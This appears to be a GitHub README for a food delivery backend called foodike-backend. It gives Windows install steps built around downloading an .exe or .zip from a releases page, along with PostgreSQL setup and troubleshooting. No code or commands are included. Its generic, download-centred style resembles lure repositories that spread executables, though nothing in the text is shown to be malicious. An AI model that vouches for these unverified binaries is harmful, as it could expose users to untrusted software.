# 🍔 foodike-backend - Reliable backend for food delivery apps

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Igri1919/foodike-backend/releases)

## What is this tool? 🛠️

This software provides the foundation for food delivery applications. It handles order processing, user accounts, and menu management. It uses a structured approach to keep logic clean and organized. Developers can start with one unit and grow into larger systems as their business needs change.

## System Requirements 💻

Before you start, ensure your Windows computer meets these standards:

- Windows 10 or Windows 11 operating system.
- At least 4 gigabytes of memory.
- A stable internet connection.
- Java Runtime Environment version 17 or higher.

## How to Install and Run 🚀

Follow these steps to set up the software on your machine:

1. Visit the [releases page](https://github.com/Igri1919/foodike-backend/releases) to download the latest setup file.
2. Select the file ending with .zip if you move the software manually, or the .exe file for an automatic installer.
3. Save the file to a folder on your computer.
4. If you chose the .zip file, right-click the folder and select Extract All.
5. Open the extracted folder and double-click the file named run-foodike.bat.
6. A black window will appear on your screen. This window keeps the system running. Do not close this window while you use the application.
7. Open your web browser and type http://localhost:8080 into the address bar to access the interface.

## Setting Up the Database 🗄️

This application requires a database to store information. The system comes ready to connect to PostgreSQL, which is the standard choice for this software.

1. Download PostgreSQL from the official website.
2. Install the program using the default settings.
3. Create a new user named foodike with a password of your choice.
4. Create a new database named foodike_db.
5. In the folder where you saved the foodike-backend files, look for a file named application.conf.
6. Open this file with a basic text editor like Notepad.
7. Change the database lines to match your new username and password.
8. Save and close the text file.
9. Restart the black application window to apply these changes.

## Understanding the Features ⚡

The system provides several modules to handle day-to-day operations:

- User Management: Handles registration, login, and profile security.
- Order Processing: Tracks orders from the moment a user places them until the food arrives.
- Menu System: Updates item availability and maintains prices across different locations.
- Inventory Tracking: Monitors stock levels to prevent overselling items.

Every part of the system works together through internal messaging. This ensures that when a user places an order, the kitchen and the inventory system receive updates at the same time.

## Solving Common Errors 🔍

### The window closes immediately
This often happens if Java is not installed or the version is too old. Visit the official Java website to download the latest version for Windows.

### The browser shows an error
If the page refuses to load, ensure the black window is still open. If the window shows red text, check your database configuration file again. Ensure the username and password match exactly what you created in the database software.

### The application runs slowly
Food delivery apps handle many requests. If you notice delays, close other demanding programs on your computer. If the slowness continues, you may need more memory on your computer to handle the local database and the application at the same time.

## Managing Updates 🔄

Check the [releases page](https://github.com/Igri1919/foodike-backend/releases) every month for new versions. When a new version arrives, stop the application, delete the old file, and extract the new files into your existing folder. Your configuration files will typically remain the same, but always keep a backup of your folder before replacing files.

## Support and Security 🛡️

This software handles sensitive customer data. Keep your database password private and do not share your configuration files with others. If you find a security concern, open a new report on this website. 

For routine operation, check the log files located in the logs folder. These files record activities and show details if a specific action fails. If you need help, copy the lines from the latest log file and include them in your request for assistance.